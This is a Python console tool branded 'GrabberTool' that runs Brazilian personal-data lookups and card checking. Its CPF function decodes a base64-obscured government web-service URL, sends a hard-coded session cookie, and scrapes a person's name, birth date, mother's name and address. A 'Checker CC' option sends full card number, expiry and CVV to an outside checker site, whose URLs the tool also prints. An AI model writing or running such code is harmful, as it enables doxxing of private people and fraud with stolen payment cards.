# Importações...
import requests
import os
import sys
import json
import time
import base64
import re
from colorama import Fore
from requests.api import request

# Banner's...
BannerMenu = (f'''
    {Fore.LIGHTBLUE_EX}
     _______            __    __               _______             __
    |   _   .----.---.-|  |--|  |--.-----.----|       .-----.-----|  |
    |.  |___|   _|  _  |  _  |  _  |  -__|   _|.|   | |  _  |  _  |  |_____.
    |.  |   |__| |___._|_____|_____|_____|__| `-|.  |-|_____|_____|________|
    |:  1   |                                   |:  |                 
    |::.. . |      Isqne & iiMaxxi              |::.|                 
    `-------'                                   `---'{Fore.LIGHTWHITE_EX}
    ''')
bannercpf= ('''
      _____                   ____       ________  ____
     / ___/__  ___  ___ __ __/ / /____ _/ ___/ _ \/ __/
    / /__/ _ \/ _ \(_-</ // / / __/ _ `/ /__/ ___/ _/  
    \___/\___/_//_/___/\_,_/_/\__/\_,_/\___/_/  /_/    
                            By Isqne | iiMaxxi
    ''')
bannerbin= ('''
      _____                   ____       ___  _____  __
     / ___/__  ___  ___ __ __/ / /____ _/ _ )/  _/ |/ /
    / /__/ _ \/ _ \(_-</ // / / __/ _ `/ _  |/ //    / 
    \___/\___/_//_/___/\_,_/_/\__/\_,_/____/___/_/|_/  
                            By Isqne | iiMaxxi
    ''')
bannerplaca= ('''
      _____                   ____       ___  __             
     / ___/__  ___  ___ __ __/ / /____ _/ _ \/ /__  ___ ____
    / /__/ _ \/ _ \(_-</ // / / __/ _ `/ ___/ / _ `/ __/ _  /
    \___/\___/_//_/___/\_,_/_/\__/\_,_/_/  /_/\_,_/\__/\_,_/ 
                            By Isqne | iiMaxxi
    ''')
bannercnpj= ('''
      _____                   ____       ______  _____     __
     / ___/__  ___  ___ __ __/ / /____ _/ ___/ |/ / _ \__ / /
    / /__/ _ \/ _ \(_-</ // / / __/ _ `/ /__/    / ___/ // / 
    \___/\___/_//_/___/\_,_/_/\__/\_,_/\___/_/|_/_/   \___/  
                            By Isqne | iiMaxxi
    ''')
bannercep= ('''
      _____                   ____       ____________ 
     / ___/__  ___  ___ __ __/ / /____ _/ ___/ __/ _ \ 
    / /__/ _ \/ _ \(_-</ // / / __/ _ `/ /__/ _// ___/
    \___/\___/_//_/___/\_,_/_/\__/\_,_/\___/___/_/    
                            By Isqne & iiMaxxi''')
bannernum = (''' 
      _____                   ____       _  __         
     / ___/__  ___  ___ __ __/ / /____ _/ |/ /_ ____ _ 
    / /__/ _ \/ _ \(_-</ // / / __/ _ `/    / // /  ' \ 
    \___/\___/_//_/___/\_,_/_/\__/\_,_/_/|_/\_,_/_/_/_/
                            By Isqne | iiMaxxi | Simples                                      
    ''')
# Menu inicial...
def menu():
    print(BannerMenu)
    print(f'''
        1 ⇁ Consulta CEP
        2 ⇁ Consulta CPF
        3 ⇁ Consulta CNPJ
        4 ⇁ Consulta Placa {Fore.LIGHTRED_EX}[OFF]{Fore.LIGHTWHITE_EX}
        5 ⇁ Consulta Bin
        6 ⇁ Consulta Numero {Fore.LIGHTRED_EX}[OFF]{Fore.LIGHTWHITE_EX}
        7 ⇁ Checker CC {Fore.LIGHTRED_EX} [OFF]{Fore.LIGHTWHITE_EX}
        10 ⇁ Site Oficial
        {Fore.LIGHTRED_EX}0 - Fechar{Fore.LIGHTWHITE_EX}
        ''')
    inputt = input('⇨ ')
    if inputt == '0' or inputt == '00':
        print('')
        os.system('cls')
        exit()
    if inputt == '1' or inputt == '01':
        print('')
        consultacep()
    if inputt == '2' or inputt == '02':
        print('')
        consultacpf()
    if inputt == '3' or inputt == '03':
        print('')
        consultacnpj()
    if inputt == '4' or inputt == '04':
        print('')
        consultaplaca()
    if inputt == '5' or inputt == '05':
        print('')
        consultabin()
    if inputt == '6' or inputt == '06':
        print('')
        consultanum()        
    if inputt == '7' or inputt == '07':
        print('')
        checkercc()
    if inputt == '10':
        os.system('cls')
        site()
    if inputt == '0' or inputt == '00':
        os.system('cls')
        exit()
    else:
        print('')
        error404()
# Comandos...
def consultacep():
    os.system('cls')
    print(bannercep)
    cep = input('Digite o CEP:\n')
    url = f"https://ws.apicep.com/cep/{cep}.json"
    json: object = requests.get(url).json()
    cep = json["code"]
    bairro = json["district"]
    estado = json["state"]
    cidade = json["city"]
    rua = json["address"]
    Spinner()
    print('')
    print('Busca Completa')
    print('Dados coletados...')
    print('-============///////=============-')
    print('CEP :', json["code"])
    print('Bairro :', json["district"])
    print('Endereco :', json["address"] )
    print('Cidade :', json["city"])
    print('Estado :', json["state"])
    print('-============///////=============-')
    print('')
    print('Em 10 Segundos voce voltara ao menu!')
    time.sleep(10.0)
    os.system('cls')
    menu()
def consultacpf():
    os.system('cls')
    a='aHR0cDovL3d3dy5qdXZlbnR1ZGV3ZWIubXRlLmdvdi5ici9wbnBlcGVzcXVpc2FzLmFzcA=='
    a=a.encode('ascii')
    a=base64.b64decode(a)
    a=a.decode('ascii')
    print(bannercpf)
    cpf = input('Digite o CPF: \n')
    h={
    'Content-Type': "text/xml, application/x-www-form-urlencoded;charset=ISO-8859-1, text/xml; charset=ISO-8859-1",
    'Cookie': "ASPSESSIONIDSCCRRTSA=NGOIJMMDEIMAPDACNIEDFBID; FGTServer=2A56DE837DA99704910F47A454B42D1A8CCF150E0874FDE491A399A5EF5657BC0CF03A1EEB1C685B4C118A83F971F6198A78",
    'Host': "www.juventudeweb.mte.gov.br"
    }
    r=requests.post(a, headers=h, data=f'acao=consultar%20cpf&cpf={cpf}&nocache=0.7636039437638835').text
    Spinner()
    print(f'''
    -============///////=============-
    CPF: {re.search('NRCPF="(.*?)"', r).group(1)}
    Nome: {re.search('NOPESSOAFISICA="(.*?)"', r).group(1).title()}
    Nascimento: {re.search('DTNASCIMENTO="(.*?)"', r).group(1)}
    Nome da Mae: {re.search('NOMAE="(.*?)"', r).group(1).title()}
    Endereco: {re.search('NOLOGRADOURO="(.*?)"', r).group(1).title()}, {re.search('NRLOGRADOURO="(.*?)"', r).group(1)}
    Complemento: {re.search('DSCOMPLEMENTO="(.*?)"', r).group(1).title()}
    Bairro: {re.search('NOBAIRRO="(.*?)"', r).group(1).title()}
    Cidade: {re.search('NOMUNICIPIO="(.*?)"', r).group(1).title()}-{re.search('SGUF="(.*?)"', r).group(1)}
    CEP: {re.search('NRCEP="(.*?)"', r).group(1)}
    -============///////=============-
    ''')
    print('')
    print('Em 5 Segundos voce voltara ao menu!')
    time.sleep(5.0)
    os.system('cls')
    menu()
def consultacnpj():
    os.system('cls')
    print(bannercnpj)
    cnpj = input('Digite o CNPJ :\n')
    print('CONSULTANDO, AGUARDE')
    url = f'https://www.receitaws.com.br/v1/cnpj/{cnpj}'
    cpj = requests.get(url).json()
    Spinner()
    print('Encontrado!')
    print('')
    print('Dados coletados...')
    print('')
    print('-============///////=============-')
    print('Nome:', cpj["nome"])
    print('Nome Fantasia:', cpj["fantasia"])
    print('Estado:', cpj["uf"])
    print('Telefone:', cpj["telefone"])
    print('Email:', cpj["email"])
    print('Data de abertura:', cpj["abertura"])
    print('Capital:', cpj["capital_social"])
    print('Situacao:', cpj["situacao"])
    print('Municipio:', cpj["municipio"])
    print('CEP:', cpj["cep"])
    print('Bairro:', cpj["bairro"])
    print('Porte:', cpj["porte"])
    print('-============///////=============-')
    print('')
    print('Em 5 Segundos voce voltara ao menu!')
    time.sleep(5.0)
    os.system('cls')
    menu()
def consultaplaca():
    print(bannerplaca)
    error404()
def consultabin():
    print(bannerbin)
    Bin = input('Insira a Bin:')
    req = requests.get(f'https://lookup.binlist.net/{Bin}')
    BIN = json.loads(req.text)
    Spinner()
    print('')
    print('Bin:', Bin)
    print('Bandeira:', BIN["scheme"])
    print('Nivel:', BIN["type"])
    print('Tipo:', BIN["brand"])
    print('Em 5 Segundos voce voltara ao menu!')
    time.sleep(5.0)
    os.system('cls')
    menu()
def consultanum():
    os.system('cls')
    print(consultanum)
    num = input('Digite o numero: ')
    numss = request.get(f'perr0ni.xyz/resultado?cel={num}')
    result = (numss.text)
    Spinner()
    print('Encontrado!')
    print('Dados coletados...')
    print('-============///////=============-')
    print( result )
    print('-============///////=============-')
    time.sleep(10.0)
    os.system('cls')
    menu()
def checkercc():
    os.system('cls')
    print()
    print('Formato checker ( NumeroCC|Mes|Ano|CCV )')
    cc = input('Digite sua CC: ')
    resultado = requests.get(f'https://grabbertool.000webhostapp.com/Checker-api/?cartaum={cc}').text
    Spinnercc()
    print('\n',resultado)
    print('Em 10 Segundos voce voltara ao menu!')
    time.sleep(10.0)
    os.system('cls')
    menu()
def site():
    print('ok!')
    print('https://grabbertool.000webhostapp.com/checker/')
    print('https://grabbertool.000webhostapp.com/Checker-V2/')
    print('https://grabbertool.000webhostapp.com/Checker-api/?cartaum=Coloque|a|cc|aki')
    print('Em 10 Segundos voce voltara ao menu!')
    time.sleep(10.0)
    os.system('cls')
    menu()
def error404():
    os.system('cls')
    print('ERROR 404 | Número Incorreto')
    print('')
    print('Em 2 Segundos voce voltara ao menu!')
    time.sleep(2.0)
    os.system('cls')
    menu()
# Spinner's 
def Spinnerinicio():
	l = ['↷', '↺', '↻',]
	for i in l+l+l:
		sys.stdout.write('\r''[*] Iniciando | Aguarde' +i)
		sys.stdout.flush()
def Spinner():
	l = ['|', '/', '-', '\\']
	for i in l+l+l:
		sys.stdout.write('\r''[*] Consultando..'+i)
		sys.stdout.flush()
		time.sleep(0.3)
def Spinnercc():
	l = ['|', '/', '-', '\\']
	for i in l+l+l:
		sys.stdout.write('\r''[*] Invadindo o sistema...'+i)
		sys.stdout.flush()
		time.sleep(0.3)
# Iniciar menu...
os.system('cls')
Spinnerinicio()
os.system('title GrabberTool Verção 1.5! {-=-} Puxando até tua alma')
menu()
